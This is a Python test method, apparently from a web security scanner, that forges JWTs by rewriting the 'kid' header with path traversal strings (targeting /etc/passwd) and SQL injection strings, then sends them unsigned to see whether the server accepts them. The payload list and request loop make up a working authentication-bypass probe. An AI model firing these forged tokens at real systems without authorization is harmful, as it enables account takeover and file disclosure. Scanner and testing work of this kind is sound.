    def test_zeroday_jwt_kid_traversal(self):
        """Zero-day #18 — JWT kid Path Traversal & SQLi.

        Tests the JWT 'kid' header for path traversal (load arbitrary
        file as signing key) and SQL injection (manipulate SQL query).
        """
        if not self.deep: return
        self._print("[*]", "Zero-day: JWT kid Traversal/SQLi...", "INFO")
        import base64, json as _json
        # Get a real JWT
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        except Exception: return
        # Test kid path traversal
        evil_kids = [
            "../../../etc/passwd",
            "../../../../../../../dev/null",
            "file:///etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "' UNION SELECT '1'-- -",
            "' OR 1=1-- -",
            "1' OR '1'='1",
        ]
        for kid in evil_kids:
            evil_header = dict(header)
            evil_header["kid"] = kid
            evil_header_b64 = base64.urlsafe_b64encode(
                _json.dumps(evil_header).encode()).decode().rstrip("=")
            evil_jwt = f"{evil_header_b64}.{parts[1]}."
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            if r2 and r2.status_code == 200:
                self._add_vuln(f"Zero-day JWT kid Bypass: {kid[:30]}",
                                "CRITICAL", self.target,
                                f"Server accepted forged JWT with kid={kid}.",
                                kid=kid)

